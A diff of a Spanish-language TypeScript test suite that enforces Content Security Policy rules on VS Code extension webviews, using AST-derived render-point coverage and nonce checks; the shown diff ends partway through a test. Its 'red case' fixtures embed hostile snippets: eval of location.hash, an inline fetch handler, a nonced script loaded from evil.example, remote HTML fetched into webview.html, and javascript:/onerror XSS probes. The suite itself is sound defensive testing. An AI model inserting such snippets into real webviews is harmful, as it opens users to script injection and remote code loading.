@@ -1,22 +1,31 @@
 /**
  * WP-V66 · CSP de webviews — test DE FACTO sobre el HTML generado.
  *
- * Dos cercos:
+ * Corrección de la devolución. La unidad verificada YA NO ES EL FICHERO
+ * sino el PUNTO DE RENDER, y la enumeración se DERIVA del AST de `src/`
+ * (`renderPointAnalysis.ts`), no de una lista escrita a mano:
  *
- * 1. CENSO CERRADO: se escanea `src/` en busca de productores/asignadores
- *    de HTML de webview. Un fichero que produzca webview fuera del censo
- *    pone la suite en ROJO (así, añadir un webview sin pasar por aquí
- *    — y por el helper de CSP — no puede entrar en verde).
+ *  1. COBERTURA DERIVADA (D1): todo punto de render del AST tiene que estar
+ *     en el censo con un render de facto, y todo lo del censo tiene que
+ *     seguir existiendo en el AST. Añadir un render — en un fichero nuevo,
+ *     en un ASIGNADOR ya censado o en un PRODUCTOR ya censado — pone la
+ *     suite en rojo. Aliasar el objeto o partir los literales no ayuda:
+ *     no se mira a qué se asigna, se mira el texto literal concatenado.
  *
- * 2. INVARIANTES POR RENDER, para CADA productor del censo:
- *    - meta CSP presente, arrancando en `default-src 'none'`
- *    - cero `unsafe-inline` / `unsafe-eval` en TODO el documento
- *    - cero orígenes http:/https: externos en la CSP (solo peers locales)
- *    - cero handlers inline (`onclick=` etc.) y cero atributos `style="`
- *    - todo `<script>`/`<style>` lleva el nonce de la CSP
- *    - nonce presente y DISTINTO entre renders (criptográfico por render)
+ *  2. SUMIDEROS (D1): toda asignación a `.html` debe delegar en un punto de
+ *     render censado; los intermediarios no pueden fabricar contenido.
+ *
+ *  3. INVARIANTES POR RENDER (D2/D3/D5): el MISMO motor que usa la guarda de
+ *     ejecución (`findWebviewHtmlViolations`) se aplica a cada render. Cubre
+ *     lo que antes no se miraba: `src` remoto en un `<script>` NONCEADO,
+ *     metas CSP dentro de comentarios y la SEGUNDA meta CSP.
+ *
+ *  4. HELPER FAIL-CLOSED (D4): las fuentes de `style/img/font` pasan por
+ *     lista blanca; comodines, orígenes externos, `;` y `"` LANZAN.
+ *
+ * Cada defecto lleva abajo su CASO ROJO: el mismo criterio que está verde
+ * sobre `src/` se demuestra rojo sobre el vector del informe.
  */
-import * as fs from 'fs';
 import * as path from 'path';
 
 // El panel de tasks arrastra el catálogo del launcher (cliente MCP real);
@@ -36,9 +45,14 @@ import {
     buildCspMeta,
     createNonce,
     escapeHtml,
-    hasCspMeta,
+    extractCspMetaContents,
+    findWebviewHtmlViolations,
+    isAllowedCspSourceToken,
+    isExtensionResourceUrl,
     isLocalOrigin,
-    requireLocalOrigin
+    isSafeWebviewHtml,
+    requireLocalOrigin,
+    stripHtmlComments
 } from '../../../src/webview/security';
 import { renderInertExternalPage } from '../../../src/webview/commonPages';
 import {
@@ -60,6 +74,7 @@ import {
     renderLocalIframePage,
     renderWebviewErrorPage,
     renderWebviewPlaceholderPage,
+    verifyDiskHtml,
     WebViewManager
 } from '../../../src/webViewManager';
 import { HackerCommandPanelProvider } from '../../../src/views/HackerCommandPanelProvider';
@@ -69,6 +84,13 @@ import { HackerTasksPanelProvider } from '../../../src/views/HackerTasksPanelPro
 import { TeatroWebViewProvider } from '../../../src/views/TeatroWebViewProvider';
 import { AgentConfigEditorProvider } from '../../../src/editors/AgentConfigEditorProvider';
 import { AgentContentEditorProvider } from '../../../src/editors/AgentContentEditorProvider';
+import {
+    analyzeSource,
+    analyzeTree,
+    FnInfo,
+    renderPointId,
+    SinkInfo
+} from './renderPointAnalysis';
 
 // ---------------------------------------------------------------------------
 // Fakes mínimos (estructurales) para renderizar fuera del Extension Host
@@ -142,12 +164,14 @@ const aiStatsFixture = {
 };
 
 // ---------------------------------------------------------------------------
-// CENSO — fuente única: productores (con render) y asignadores (solo consumo)
+// CENSO · un punto de render = una función que produce HTML, con su render
+// de facto. El identificador es `fichero::función`, el mismo que deriva el
+// AST: así el censo y la derivación se comparan término a término.
 // ---------------------------------------------------------------------------
 
 interface CensoEntry {
+    /** `fichero::función`, igual que `renderPointId` */
     id: string;
-    file: string; // relativo a la raíz del repo
     render: () => string;
 }
 
@@ -158,166 +182,243 @@ function hackerPanelRender(ProviderCtor: any): () => string {
     };
 }
 
-/** PRODUCTORES: cada punto que genera HTML de webview, con su render de facto. */
-const PRODUCTORES: CensoEntry[] = [
-    { id: 'panel-hacker-command', file: 'src/views/HackerCommandPanelProvider.ts', render: hackerPanelRender(HackerCommandPanelProvider) },
-    { id: 'panel-hacker-config', file: 'src/views/HackerConfigPanelProvider.ts', render: hackerPanelRender(HackerConfigPanelProvider) },
+const CENSO: CensoEntry[] = [
+    // --- documentos completos -------------------------------------------------
+    { id: 'src/views/BaseHackerPanelProvider.ts::generateBaseHtml', render: hackerPanelRender(HackerCommandPanelProvider) },
     {
-        id: 'panel-hacker-control',
-        file: 'src/views/HackerControlPanelProvider.ts',
-        render: () => {
-            WebViewManager.getInstance(makeFakeContext());
-            return hackerPanelRender(HackerControlPanelProvider)();
-        }
-    },
-    { id: 'panel-hacker-tasks', file: 'src/views/HackerTasksPanelProvider.ts', render: hackerPanelRender(HackerTasksPanelProvider) },
-    { id: 'base-hacker (via 4 paneles)', file: 'src/views/BaseHackerPanelProvider.ts', render: hackerPanelRender(HackerCommandPanelProvider) },
-    {
-        id: 'teatro-webview',
-        file: 'src/views/TeatroWebViewProvider.ts',
+        id: 'src/views/TeatroWebViewProvider.ts::_getHtmlForWebview',
         render: () => {
             const p: any = new TeatroWebViewProvider(fakeUri, makeFakeContext(), {} as any);
             return p._getHtmlForWebview(fakeWebview);
         }
     },
     {
-        id: 'editor-agent-config',
-        file: 'src/editors/AgentConfigEditorProvider.ts',
+        id: 'src/editors/AgentConfigEditorProvider.ts::getHtmlForWebview',
         render: () => {
             const p: any = new (AgentConfigEditorProvider as any)(makeFakeContext());
             return p.getHtmlForWebview(fakeWebview, fakeConfigDocument);
         }
     },
     {
-        id: 'editor-agent-content',
-        file: 'src/editors/AgentContentEditorProvider.ts',
+        id: 'src/editors/AgentContentEditorProvider.ts::getHtmlForWebview',
         render: () => {
             const p: any = new (AgentContentEditorProvider as any)(makeFakeContext());
             return p.getHtmlForWebview(fakeWebview, fakeContentDocument);
         }
     },
-    { id: 'analytics-dashboard (V80)', file: 'src/core/bootstrap/analyticsDashboardHtml.ts', render: () => generateAnalyticsDashboard(aggregationFixture) },
-    { id: 'analytics-summary', file: 'src/core/analyticsService.ts', render: () => renderAnalyticsSummaryPage([['Total Events', 3], ['Sesión', 's<x>']]) },
-    { id: 'pages-ai-response', file: 'src/webview/bootstrapPages.ts', render: () => renderAiResponsePage(aiResponseFixture) },
-    { id: 'pages-ai-code-analysis', file: 'src/webview/bootstrapPages.ts', render: () => renderAiCodeAnalysisPage(aiResponseFixture, 'const a = "<script>"', 'ts') },
-    { id: 'pages-ai-workflow', file: 'src/webview/bootstrapPages.ts', render: () => renderAiWorkflowPage(aiResponseFixture) },
-    { id: 'pages-ai-stats', file: 'src/webview/bootstrapPages.ts', render: () => renderAiStatsPage(aiStatsFixture) },
-    { id: 'pages-agent-validation', file: 'src/webview/bootstrapPages.ts', render: () => renderAgentValidationPage(1, 1, ['✅ ok', '❌ <img src=x onerror=alert(1)>']) },
-    { id: 'pages-webview-dashboard', file: 'src/webview/bootstrapPages.ts', render: () => renderWebviewDashboardPage() },
-    { id: 'command-palette-dashboard', file: 'src/commandPaletteManager.ts', render: () => renderCommandDashboardPage() },
-    { id: 'mcp-server-manager', file: 'src/mcpServerManager.ts', render: () => renderMcpManagerPage() },
-    { id: 'ui-manager', file: 'src/uiManager.ts', render: () => renderUiManagerPage() },
-    { id: 'socket-monitor', file: 'src/socketMonitor.ts', render: () => renderSocketMonitorPage('http://localhost:3000') },
-    { id: 'mcp-webview (iframe local)', file: 'src/mcpWebViewManager.ts', render: () => renderMcpWebViewPage('http://localhost:4200', 'Web Local') },
-    { id: 'webview-manager-iframe-local', file: 'src/webViewManager.ts', render: () => renderLocalIframePage('http://127.0.0.1:4201', 'UI Local') },
-    { id: 'webview-manager-error', file: 'src/webViewManager.ts', render: () => renderWebviewErrorPage('boom <script>') },
-    { id: 'webview-manager-placeholder', file: 'src/webViewManager.ts', render: () => renderWebviewPlaceholderPage('Titulo') },
-    { id: 'pagina-inerte-externa', file: 'src/webview/commonPages.ts', render: () => renderInertExternalPage('https://example.com/x', 'Externo') }
+    { id: 'src/core/bootstrap/analyticsDashboardHtml.ts::generateAnalyticsDashboard', render: () => generateAnalyticsDashboard(aggregationFixture) },
+    { id: 'src/core/analyticsService.ts::renderAnalyticsSummaryPage', render: () => renderAnalyticsSummaryPage([['Total Events', 3], ['Sesión', 's<x>']]) },
+    { id: 'src/webview/bootstrapPages.ts::renderAiResponsePage', render: () => renderAiResponsePage(aiResponseFixture) },
+    { id: 'src/webview/bootstrapPages.ts::renderAiCodeAnalysisPage', render: () => renderAiCodeAnalysisPage(aiResponseFixture, 'const a = "<script>"', 'ts') },
+    { id: 'src/webview/bootstrapPages.ts::renderAiWorkflowPage', render: () => renderAiWorkflowPage(aiResponseFixture) },
+    { id: 'src/webview/bootstrapPages.ts::renderAiStatsPage', render: () => renderAiStatsPage(aiStatsFixture) },
+    { id: 'src/webview/bootstrapPages.ts::renderAgentValidationPage', render: () => renderAgentValidationPage(1, 1, ['✅ ok', '❌ <img src=x onerror=alert(1)>']) },
+    { id: 'src/webview/bootstrapPages.ts::renderWebviewDashboardPage', render: () => renderWebviewDashboardPage() },
+    { id: 'src/commandPaletteManager.ts::renderCommandDashboardPage', render: () => renderCommandDashboardPage() },
+    { id: 'src/mcpServerManager.ts::renderMcpManagerPage', render: () => renderMcpManagerPage() },
+    { id: 'src/uiManager.ts::renderUiManagerPage', render: () => renderUiManagerPage() },
+    { id: 'src/socketMonitor.ts::renderSocketMonitorPage', render: () => renderSocketMonitorPage('http://localhost:3000') },
+    { id: 'src/mcpWebViewManager.ts::renderMcpWebViewPage', render: () => renderMcpWebViewPage('http://localhost:4200', 'Web Local') },
+    { id: 'src/webViewManager.ts::renderLocalIframePage', render: () => renderLocalIframePage('http://127.0.0.1:4201', 'UI Local') },
+    { id: 'src/webViewManager.ts::renderWebviewErrorPage', render: () => renderWebviewErrorPage('boom <script>') },
+    { id: 'src/webViewManager.ts::renderWebviewPlaceholderPage', render: () => renderWebviewPlaceholderPage('Titulo') },
+    { id: 'src/webview/commonPages.ts::renderInertExternalPage', render: () => renderInertExternalPage('https://example.com/x', 'Externo') },
+
+    // --- cuerpos de panel: fragmentos que sólo existen dentro del documento
+    //     base, con render de facto propio (el documento completo del panel) ---
+    { id: 'src/views/HackerCommandPanelProvider.ts::getHtmlContent', render: hackerPanelRender(HackerCommandPanelProvider) },
+    { id: 'src/views/HackerConfigPanelProvider.ts::getHtmlContent', render: hackerPanelRender(HackerConfigPanelProvider) },
+    {
+        id: 'src/views/HackerControlPanelProvider.ts::getHtmlContent',
+        render: () => {
+            WebViewManager.getInstance(makeFakeContext());
+            return hackerPanelRender(HackerControlPanelProvider)();
+        }
+    },
+    { id: 'src/views/HackerTasksPanelProvider.ts::getHtmlContent', render: hackerPanelRender(HackerTasksPanelProvider) }
 ];
+
+const CENSO_IDS = new Set(CENSO.map(e => e.id));
+
+// ---------------------------------------------------------------------------
+// Derivación del AST sobre `src/` (fuente de verdad de la enumeración)
+// ---------------------------------------------------------------------------
+
+const REPO_ROOT = path.resolve(__dirname, '../../..');
+const SRC_ROOT = path.join(REPO_ROOT, 'src');
+
+const analysis = analyzeTree(SRC_ROOT, REPO_ROOT);
+
+const derivedDocs = analysis.functions.filter(f => f.kind === 'document');
+const derivedFrags = analysis.functions.filter(f => f.kind === 'fragment');
+
+/** Índice nombre simple → implementaciones (grafo de llamadas por nombre). */
+const byName = new Map<string, FnInfo[]>();
+for (const fn of analysis.functions) {
+    const list = byName.get(fn.name) ?? [];
+    list.push(fn);
+    byName.set(fn.name, list);
+}
 
 /**
- * ASIGNADORES: ficheros que asignan `webview.html` o participan del marco
- * pero cuyo HTML procede de un PRODUCTOR del censo (o son el helper mismo).
+ * BFS por el grafo de llamadas desde un nombre simple hasta un punto de
+ * render censado. Devuelve las funciones que quedan EN EL CAMINO (no todo
+ * lo que se visitó de paso: un delegador puede llamar a cosas ajenas al
+ * HTML, y ésas no son intermediarios de nada).
  */
-const ASIGNADORES: string[] = [
-    'src/core/bootstrap/commands/aiCommands.ts',           // consume bootstrapPages
-    'src/core/bootstrap/commands/agentManagementCommands.ts', // consume bootstrapPages
-    'src/core/bootstrap/commands/webviewCommands.ts',      // consume bootstrapPages
-    'src/core/bootstrap/commands/analyticsCommands.ts',    // consume analyticsDashboardHtml
-    'src/core/bootstrap/commands/teatroCommands.ts',       // reusa TeatroWebViewProvider
-    'src/webview/security.ts'                              // helper (meta CSP)
-];
-
-const CENSO_FILES = new Set<string>([
-    ...PRODUCTORES.map(p => p.file),
-    ...ASIGNADORES
-]);
-
-// ---------------------------------------------------------------------------
-// Utilidades de verificación
-// ---------------------------------------------------------------------------
-
-const CSP_META_RE = /<meta\s+http-equiv="Content-Security-Policy"\s+content="([^"]*)"/;
-
-function extractCsp(html: string): string {
-    const m = html.match(CSP_META_RE);
-    expect(m).not.toBeNull();
-    return m![1];
+function pathToCensus(startName: string, maxDepth = 5): FnInfo[] | undefined {
+    const prev = new Map<string, string | undefined>([[startName, undefined]]);
+    const seen = new Set<string>();
+    let frontier = [startName];
+    for (let depth = 0; depth <= maxDepth && frontier.length > 0; depth++) {
+        const next: string[] = [];
+        for (const name of frontier) {
+            if (seen.has(name)) {
+                continue;
+            }
+            seen.add(name);
+            const impls = byName.get(name) ?? [];
+            if (impls.some(i => CENSO_IDS.has(renderPointId(i)))) {
+                const chain: string[] = [];
+                let cur: string | undefined = name;
+                while (cur !== undefined) {
+                    chain.unshift(cur);
+                    cur = prev.get(cur);
+                }
+                // intermediarios = todo lo del camino salvo el render censado
+                return chain.slice(0, -1).flatMap(n => byName.get(n) ?? []);
+            }
+            for (const impl of impls) {
+                for (const callee of impl.callees) {
+                    if (!prev.has(callee)) {
+                        prev.set(callee, name);
+                        next.push(callee);
+                    }
+                }
+            }
+        }
+        frontier = next;
+    }
+    return undefined;
 }
 
-function extractCspNonces(csp: string): string[] {
-    return Array.from(csp.matchAll(/'nonce-([^']+)'/g)).map(m => m[1]);
+/** Nombres alcanzables desde los puntos de render censados (para fragmentos). */
+const reachableFromCensus = (() => {
+    const seen = new Set<string>();
+    let frontier = analysis.functions
+        .filter(f => CENSO_IDS.has(renderPointId(f)))
+        .flatMap(f => f.callees);
+    for (let depth = 0; depth < 5 && frontier.length > 0; depth++) {
+        const next: string[] = [];
+        for (const name of frontier) {
+            if (seen.has(name)) {
+                continue;
+            }
+            seen.add(name);
+            for (const impl of byName.get(name) ?? []) {
+                next.push(...impl.callees);
+            }
+        }
+        frontier = next;
+    }
+    return seen;
+})();
+
+/** Huecos de cobertura: puntos de render derivados que el censo no cubre. */
+function coverageGaps(fns: FnInfo[]): string[] {
+    return fns.filter(f => f.kind === 'document').map(renderPointId).filter(id => !CENSO_IDS.has(id));
 }
 
-/** Tokens de fuente admitidos en la CSP: nada externo vivo. */
-function assertOnlyLocalSources(csp: string): void {
-    const tokens = csp
-        .split(';')
-        .map(d => d.trim())
-        .filter(Boolean)
-        .flatMap(d => d.split(/\s+/).slice(1)); // descarta el nombre de la directiva
-    for (const token of tokens) {
-        const ok =
-            token === "'none'" ||
-            token === "'self'" ||
-            /^'nonce-[^']+'$/.test(token) ||
-            token === FAKE_CSP_SOURCE ||
-            /^https?:\/\/localhost(:\d+)?$/.test(token) ||
-            /^https?:\/\/127\.0\.0\.1(:\d+)?$/.test(token) ||
-            /^https?:\/\/\[::1\](:\d+)?$/.test(token);
-        if (!ok) {
-            throw new Error(`Fuente no local en CSP: "${token}" (csp: ${csp})`);
+/** Sumideros injustificados: `.html =` que no delega en un render censado. */
+function unjustifiedSinks(sinks: SinkInfo[]): string[] {
+    const bad: string[] = [];
+    for (const sink of sinks) {
+        if (!sink.callee) {
+            bad.push(`${sink.file}:${sink.line} — el HTML no procede de una llamada: ${sink.code}`);
+            continue;
+        }
+        const intermediates = pathToCensus(sink.callee);
+        if (!intermediates) {
+            bad.push(`${sink.file}:${sink.line} — "${sink.callee}" no alcanza ningún render censado`);
+            continue;
+        }
+        for (const mid of intermediates) {
+            if (mid.kind === 'none' && !mid.pureDelegator && !mid.validates) {
+                bad.push(
+                    `${sink.file}:${sink.line} — intermediario "${renderPointId(mid)}" ni delega en limpio ni valida`
+                );
+            }
         }
     }
-}
-
-function verifyCspInvariants(id: string, html: string): void {
-    // 1. Meta CSP presente y fail-closed
-    const csp = extractCsp(html);
-    expect(csp.startsWith("default-src 'none'")).toBe(true);
-
-    // 2. Cero unsafe-inline / unsafe-eval en TODO el documento
-    expect(html).not.toMatch(/unsafe-inline/);
-    expect(html).not.toMatch(/unsafe-eval/);
-
-    // 3. Cero orígenes externos en la CSP
-    assertOnlyLocalSources(csp);
-
-    // 4. Cero handlers inline y cero style= inline (estático o inyectado)
-    expect(html).not.toMatch(/\son\w+\s*=\s*["'`\\]/i);
-    expect(html).not.toMatch(/\sstyle\s*=\s*["'`\\]/i);
-
-    // 5. Todo <script>/<style> lleva el nonce declarado en la CSP
-    const nonces = extractCspNonces(csp);
-    for (const tag of html.match(/<script\b[^>]*>/g) ?? []) {
-        const m = tag.match(/nonce="([^"]+)"/);
-        expect(m).not.toBeNull();
-        expect(nonces).toContain(m![1]);
-    }
-    for (const tag of html.match(/<style\b[^>]*>/g) ?? []) {
-        const m = tag.match(/nonce="([^"]+)"/);
-        expect(m).not.toBeNull();
-        expect(nonces).toContain(m![1]);
-    }
-
-    // 6. Nonce presente (criptográfico por render)
-    expect(nonces.length).toBeGreaterThan(0);
+    return bad;
 }
 
 // ---------------------------------------------------------------------------
-// 1 · Invariantes de CSP por productor del censo
+// 1 · Cobertura derivada: la enumeración no la escribe nadie a mano (D1)
 // ---------------------------------------------------------------------------
 
-describe('WP-V66 · CSP de facto por productor del censo', () => {
-    for (const entry of PRODUCTORES) {
-        test(`${entry.id} — meta CSP, cero unsafe-inline, cero externos, nonce`, () => {
-            const html = entry.render();
-            verifyCspInvariants(entry.id, html);
+describe('WP-V66 · censo derivado del AST (unidad = punto de render)', () => {
+    test('todo documento de webview derivado de src/ está cubierto por el censo', () => {
+        expect(coverageGaps(analysis.functions)).toEqual([]);
+    });
+
+    test('el censo no lista puntos de render muertos (todo id sigue derivándose)', () => {
+        const derivedIds = new Set(
+            analysis.functions.filter(f => f.kind !== 'none').map(renderPointId)
+        );
+        const muertos = [...CENSO_IDS].filter(id => !derivedIds.has(id));
+        expect(muertos).toEqual([]);
+    });
+
+    test('todo fragmento HTML derivado está conectado a un render censado', () => {
+        const sueltos = derivedFrags
+            .filter(f => !CENSO_IDS.has(renderPointId(f)))
+            .filter(f => !f.ancestors.some(a => byName.get(a)?.some(impl => CENSO_IDS.has(renderPointId(impl)))))
+            .filter(f => !reachableFromCensus.has(f.name))
+            .filter(f => !pathToCensus(f.name))
+            .map(renderPointId);
+        expect(sueltos).toEqual([]);
+    });
+
+    test('la contabilidad declarada del censo se sostiene y es derivada', () => {
+        // 25 puntos de render = 21 documentos completos + 4 cuerpos de panel
+        expect(derivedDocs.length).toBe(21);
+        expect(CENSO.length).toBe(25);
+        // repartidos en 18 ficheros productores únicos
+        const ficherosProductores = new Set(CENSO.map(e => e.id.split('::')[0]));
+        expect(ficherosProductores.size).toBe(18);
+        // más los ficheros que sólo asignan HTML producido en otro sitio
+        const ficherosAsignadores = new Set(
+            analysis.sinks.map(s => s.file).filter(f => !ficherosProductores.has(f))
+        );
+        expect([...ficherosAsignadores].sort()).toEqual([
+            'src/core/bootstrap/commands/agentManagementCommands.ts',
+            'src/core/bootstrap/commands/aiCommands.ts',
+            'src/core/bootstrap/commands/analyticsCommands.ts',
+            'src/core/bootstrap/commands/webviewCommands.ts'
+        ]);
+    });
+
+    test('todo sumidero `.html =` de src/ delega en un render censado', () => {
+        expect(unjustifiedSinks(analysis.sinks)).toEqual([]);
+    });
+});
+
+// ---------------------------------------------------------------------------
+// 2 · Invariantes por punto de render — mismo motor que la guarda de ejecución
+// ---------------------------------------------------------------------------
+
+describe('WP-V66 · CSP de facto por punto de render censado', () => {
+    for (const entry of CENSO) {
+        test(`${entry.id} — sin violaciones de la política de webview`, () => {
+            expect(findWebviewHtmlViolations(entry.render())).toEqual([]);
         });
 
         test(`${entry.id} — nonce distinto entre renders`, () => {
-            const a = extractCspNonces(extractCsp(entry.render()));
-            const b = extractCspNonces(extractCsp(entry.render()));
+            const nonceOf = (html: string) =>
+                extractCspMetaContents(html).flatMap(c => Array.from(c.matchAll(/'nonce-([^']+)'/g)).map(m => m[1]));
+            const a = nonceOf(entry.render());
+            const b = nonceOf(entry.render());
             expect(a.length).toBeGreaterThan(0);
             expect(b.length).toBeGreaterThan(0);
             expect(a[0]).not.toEqual(b[0]);
@@ -326,13 +427,13 @@ describe('WP-V66 · CSP de facto por productor del censo', () => {
 });
 
 // ---------------------------------------------------------------------------
-// 2 · Cerco local: iframes solo a peers locales; lo externo queda inerte
+// 3 · Cerco local: iframes solo a peers locales; lo externo queda inerte
 // ---------------------------------------------------------------------------
 
 describe('WP-V66 · cerco local-first en iframes', () => {
     test('URL externa en mcpWebViewManager degrada a página inerte (sin iframe, sin ancla viva)', () => {
         const html = renderMcpWebViewPage('https://evil.example.com', 'Externo');
-        verifyCspInvariants('mcp-webview-externo', html);
+        expect(findWebviewHtmlViolations(html)).toEqual([]);
         expect(html).not.toMatch(/<iframe/i);
         expect(html).not.toMatch(/<a\s/i);
         expect(html).not.toMatch(/frame-src/);
@@ -340,20 +441,19 @@ describe('WP-V66 · cerco local-first en iframes', () => {
 
     test('URL externa en webViewManager degrada a página inerte', () => {
         const html = renderLocalIframePage('https://evil.example.com', 'Externo');
-        verifyCspInvariants('webview-manager-externo', html);
+        expect(findWebviewHtmlViolations(html)).toEqual([]);
         expect(html).not.toMatch(/<iframe/i);
         expect(html).not.toMatch(/frame-src/);
     });
 
     test('URL local sí produce frame-src acotado a su origen', () => {
         const html = renderLocalIframePage('http://localhost:4201/app', 'Local');
-        const csp = extractCsp(html);
-        expect(csp).toMatch(/frame-src http:\/\/localhost:4201/);
+        expect(extractCspMetaContents(html)[0]).toMatch(/frame-src http:\/\/localhost:4201/);
     });
 });
 
 // ---------------------------------------------------------------------------
-// 3 · Helper: fail-closed (el intento de bypass LANZA, no degrada)
+// 4 · Helper: fail-closed (el intento de bypass LANZA, no degrada)
 // ---------------------------------------------------------------------------
 
 describe('WP-V66 · helper de CSP fail-closed', () => {
@@ -391,56 +491,264 @@ describe('WP-V66 · helper de CSP fail-closed', () => {
         expect(buildCspMeta({})).toContain(`content="default-src 'none';"`);
     });
 
-    test('hasCspMeta detecta la ausencia de CSP (guarda de HTML de disco)', () => {
-        expect(hasCspMeta('<html><head></head></html>')).toBe(false);
-        expect(hasCspMeta(buildCspMeta({}))).toBe(true);
-    });
-
     test('escapeHtml neutraliza los cinco metacaracteres', () => {
         expect(escapeHtml(`<script>"'&`)).toBe('&lt;script&gt;&quot;&#39;&amp;');
     });
 });
 
 // ---------------------------------------------------------------------------
-// 4 · Censo cerrado: webview fuera del censo = ROJO
+// CASOS ROJOS · D1 — el censo es de puntos de render, no de ficheros
 // ---------------------------------------------------------------------------
 
-describe('WP-V66 · censo cerrado de productores de webview', () => {
-    const SRC_ROOT = path.resolve(__dirname, '../../../src');
-    const REPO_ROOT = path.resolve(__dirname, '../../..');
+describe('WP-V66 · D1 · los tres bypass del censo por ficheros quedan en rojo', () => {
+    test('1B · alias del webview + literales partidos en un fichero nuevo', () => {
+        const hostil = `
+            import * as vscode from 'vscode';
+            export function abrirPanelSospechoso(panel: any) {
+                const wv = panel.webview;                       // alias: el nombre no importa
+                wv.html = '<!DOCTYPE ' + 'html>' +              // literal partido
+                    '<html><head></head><body>' +
+                    '<script>eval(location.hash)</script>' +
+                    '<div onclick="fetch(1)" style="color:red"></div>' +
+                    '</body></html>';
+            }`;
+        const a = analyzeSource('src/panelSospechoso.ts', hostil);
 
-    function listTsFiles(dir: string): string[] {
-        const out: string[] = [];
-        for (const name of fs.readdirSync(dir)) {
-            const full = path.join(dir, name);
-            const stat = fs.statSync(full);
-            if (stat.isDirectory()) {
-                out.push(...listTsFiles(full));
-            } else if (name.endsWith('.ts') && !name.endsWith('.d.ts')) {
-                out.push(full);
-            }
-        }
-        return out;
-    }
-
-    const WEBVIEW_SIGNAL = /webview\.html\s*=|<!DOCTYPE html|<html[\s>]/i;
-
-    test('todo fichero de src/ que produce o asigna HTML de webview está en el censo', () => {
-        const fueraDeCenso: string[] = [];
-        for (const file of listTsFiles(SRC_ROOT)) {
-            const rel = path.relative(REPO_ROOT, file).replace(/\\/g, '/');
-            const content = fs.readFileSync(file, 'utf8');
-            if (WEBVIEW_SIGNAL.test(content) && !CENSO_FILES.has(rel)) {
-                fueraDeCenso.push(rel);
-            }
-        }
-        expect(fueraDeCenso).toEqual([]);
+        // el punto de render aparece pese al alias y a los literales partidos
+        expect(coverageGaps(a.functions)).toEqual([
+            'src/panelSospechoso.ts::abrirPanelSospechoso'
+        ]);
+        // y además el sumidero no delega en ningún render censado
+        expect(unjustifiedSinks(a.sinks).length).toBeGreaterThan(0);
     });
 
-    test('el censo no lista ficheros muertos (todo censado sigue existiendo y produciendo)', () => {
-        for (const rel of CENSO_FILES) {
-            const full = path.join(REPO_ROOT, rel);
-            expect(fs.existsSync(full)).toBe(true);
+    test('1B-bis · Object.assign(panel.webview, { html }) también es sumidero', () => {
+        const hostil = `
+            export function colar(panel: any, html: string) {
+                Object.assign(panel.webview, { html });
+            }`;
+        const a = analyzeSource('src/colar.ts', hostil);
+        expect(a.sinks.length).toBe(1);
+        expect(unjustifiedSinks(a.sinks).length).toBe(1);
+    });
+
+    test('7 · render hostil añadido a un ASIGNADOR ya censado', () => {
+        const hostil = `
+            import { renderAiResponsePage } from '../../../webview/bootstrapPages';
+            export function registerAiCommands(ctx: any) {
+                const panel: any = {};
+                panel.webview.html = renderAiResponsePage({});
+            }
+            export function registerAiDebugPanel(panel: any) {
+                panel.webview.html = \`<!DOCTYPE html><html><body>
+                    <script src="https://evil.example/x.js"></script></body></html>\`;
+            }`;
+        const a = analyzeSource('src/core/bootstrap/commands/aiCommands.ts', hostil);
+        expect(coverageGaps(a.functions)).toEqual([
+            'src/core/bootstrap/commands/aiCommands.ts::registerAiDebugPanel'
+        ]);
+    });
+
+    test('8 · render nº 26 exportado desde un PRODUCTOR ya censado', () => {
+        const hostil = `
+            export function renderPanelExtra(): string {
+                return \`<!DOCTYPE html><html><head></head><body>ok</body></html>\`;
+            }`;
+        const a = analyzeSource('src/webview/bootstrapPages.ts', hostil);
+        expect(coverageGaps(a.functions)).toEqual([
+            'src/webview/bootstrapPages.ts::renderPanelExtra'
+        ]);
+    });
+
+    test('un sumidero que no procede de una llamada (HTML remoto) queda en rojo', () => {
+        const hostil = `
+            export async function pintar(panel: any) {
+                const remoto = await (await fetch('https://evil.example/p')).text();
+                panel.webview.html = remoto;
+            }`;
+        const a = analyzeSource('src/pintar.ts', hostil);
+        expect(unjustifiedSinks(a.sinks)).toEqual([
+            'src/pintar.ts:4 — el HTML no procede de una llamada: panel.webview.html = remoto'
+        ]);
+    });
+
+    test('el mismo criterio está VERDE sobre src/ (no es un test que siempre falla)', () => {
+        expect(coverageGaps(analysis.functions)).toEqual([]);
+        expect(unjustifiedSinks(analysis.sinks)).toEqual([]);
+    });
+});
+
+// ---------------------------------------------------------------------------
+// CASOS ROJOS · D2 — el nonce NO redime a un <script src> remoto
+// ---------------------------------------------------------------------------
+
+describe('WP-V66 · D2 · script externo CON nonce queda en rojo', () => {
+    const conNonce = (extra: string) => {
+        const nonce = createNonce();
+        return `<!DOCTYPE html><html><head>${buildCspMeta({ scriptNonce: nonce })}</head>
+            <body>${extra.replace(/__NONCE__/g, nonce)}</body></html>`;
+    };
+
+    test('<script nonce src="https://evil.example/x.js"> es violación', () => {
+        const html = conNonce('<script nonce="__NONCE__" src="https://evil.example/x.js"></script>');
+        const v = findWebviewHtmlViolations(html);
+        expect(v).toContainEqual(expect.stringContaining('recurso remoto en <script src>'));
+        expect(isSafeWebviewHtml(html)).toBe(false);
+    });
+
+    test('un <script src> de recurso propio SÍ pasa (no es un rechazo indiscriminado)', () => {
+        const html = conNonce('<script nonce="__NONCE__" src="vscode-resource:/ext/media/x.js"></script>');
+        expect(findWebviewHtmlViolations(html)).toEqual([]);
+    });
+
+    test('protocol-relative //evil y esquemas raros no cuelan como "relativo"', () => {
+        expect(isExtensionResourceUrl('//evil.example/x.js')).toBe(false);
+        expect(isExtensionResourceUrl('\\\\evil.example\\x.js')).toBe(false);
+        expect(isExtensionResourceUrl('javascript:alert(1)')).toBe(false);
+        expect(isExtensionResourceUrl('data:text/javascript,alert(1)')).toBe(false);
+        expect(isExtensionResourceUrl('https://cdn.jsdelivr.net/x.js')).toBe(false);
+        expect(isExtensionResourceUrl('media/x.js')).toBe(true);
+        expect(isExtensionResourceUrl('vscode-resource:/ext/media/x.js')).toBe(true);
+        expect(isExtensionResourceUrl('https://file%2B.vscode-resource.vscode-cdn.net/a.css')).toBe(true);
+    });
+
+    test('CSS, iframe y form remotos también caen', () => {
+        expect(findWebviewHtmlViolations(conNonce('<link href="https://evil.example/a.css" rel="stylesheet">')))
+            .toContainEqual(expect.stringContaining('recurso remoto en <link href>'));
+        expect(findWebviewHtmlViolations(conNonce('<iframe src="https://evil.example/"></iframe>')))
+            .toContainEqual(expect.stringContaining('recurso remoto en <iframe src>'));
